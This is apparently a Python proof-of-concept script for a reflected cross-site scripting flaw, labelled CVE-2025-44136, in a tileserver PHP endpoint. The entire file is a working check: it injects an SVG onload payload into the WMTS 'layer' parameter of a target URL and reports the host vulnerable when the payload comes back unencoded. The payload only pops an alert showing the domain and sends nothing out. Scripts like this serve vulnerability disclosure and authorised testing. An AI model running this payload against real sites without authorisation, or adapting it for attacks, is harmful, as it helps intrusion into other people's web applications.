#!/usr/bin/env python3

import requests
import sys
import urllib.parse

def test_xss(target_url):
    xss_payload = '<svg onload=alert(document.domain)>'
    encoded_payload = urllib.parse.quote(xss_payload)
    
    vuln_url = f"{target_url}/tileserver/tileserver.php/wmts/x/1/1/asd?Request=x&layer={encoded_payload}"
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Testing CVE-2025-44136 XSS vulnerability")
    print(f"[*] Payload: {xss_payload}")
    print(f"[*] URL: {vuln_url}")
    print()
    
    try:
        response = requests.get(vuln_url, timeout=10)
        
        if xss_payload in response.text:
            print("[+] VULNERABLE!")
            print(f"[+] Status Code: {response.status_code}")
            print(f"[+] Response contains unencoded XSS payload:")
            print(f"    {response.text.strip()}")
            return True
        else:
            print("[-] Not vulnerable or patched")
            print(f"[-] Response: {response.text[:200]}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    success = test_xss(target)
    sys.exit(0 if success else 1)
